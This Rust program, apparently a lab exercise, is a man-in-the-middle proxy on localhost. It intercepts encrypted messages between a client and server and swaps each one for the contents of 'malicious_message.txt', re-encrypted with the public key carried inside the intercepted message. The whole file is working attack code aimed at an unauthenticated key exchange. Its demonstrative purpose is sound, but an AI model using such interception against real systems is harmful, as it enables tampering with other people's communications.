use std::net::TcpListener;
use std::io::{Read, Write};
use std::error::Error;
use std::fs::File;
use std::net::TcpStream;

use openssl::pkey::PKey;

// Declare the `encrypted_message` module so it can be used in this file
mod encrypted_message;
use encrypted_message::EncryptedMessage;

fn handle_client(mut client: &TcpStream) -> Result<(), Box<dyn Error>> {
    // Connect to the real server
    let server_port = 8000;
    let mut server = TcpStream::connect(format!("127.0.0.1:{server_port}"))?;

    // Infinitely forward messages between client and server until one of the connections is closed
    loop {
        // Forward data from client to server
        if let Ok(mut received) = receive_message(&mut client) {
            if received.len() == 0 {
                println!("Client closed connection");
                break; // Client closed connection
            }
            if received != b"give_public_key" {
                println!("Modifying data to send to server");
                let received_message: EncryptedMessage = EncryptedMessage::decode(&received)?;
                let public_key= PKey::public_key_from_pem(&received_message.public_key)?;
                // Craft new data for the server to accept
                received = EncryptedMessage::new(read_message_from_file()?, &public_key)?.encode()?;
            }
            send_message(&mut server, &received)?;
            println!("Forwarded {} bytes to server", received.len());
        }

        // Forward data from server to client
        if let Ok(received) = receive_message(&mut server) {
            if received.len() == 0 {
                println!("Server closed connection");
                break; // Server closed connection
            }
            send_message(&mut client, &received)?;
            println!("Forwarded {} bytes to client", received.len());
        }
    }

    Ok(())
}

fn read_message_from_file() -> Result<Vec<u8>, std::io::Error> {
    // Read the file to send
    let file_path = "./malicious_message.txt";
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    Ok(buffer)
}

fn send_message(stream: &mut impl Write, message: &[u8]) -> std::io::Result<()> {
    let len = message.len() as u32;
    let len_bytes = len.to_be_bytes();
    stream.write_all(&len_bytes)?; // Include the message length as the first 4 bytes
    stream.write_all(message)?;
    stream.flush()?;
    Ok(())
}

fn receive_message(stream: &mut impl Read) -> std::io::Result<Vec<u8>> {
    let mut len_bytes = [0u8; 4];
    stream.read_exact(&mut len_bytes)?;  // Read the message exactly, using the message length
    let len = u32::from_be_bytes(len_bytes);
    let mut buffer = vec![0; len as usize];
    stream.read_exact(&mut buffer)?;
    Ok(buffer)
}

fn main() -> Result<(), Box<dyn Error>> {
    let port = 8666;
    let listener = TcpListener::bind(format!("127.0.0.1:{port}"))?;
    println!("MITM listening on port {port}...");

    // Loop through incoming connection streams indefinitely
    for stream in listener.incoming() {
        match stream {
            Ok(client) => {
                handle_client(&client)?;
            }
            Err(e) => {
                eprint!("Failed to accept connection: {}", e);
            }
        }
    }

    Ok(())
}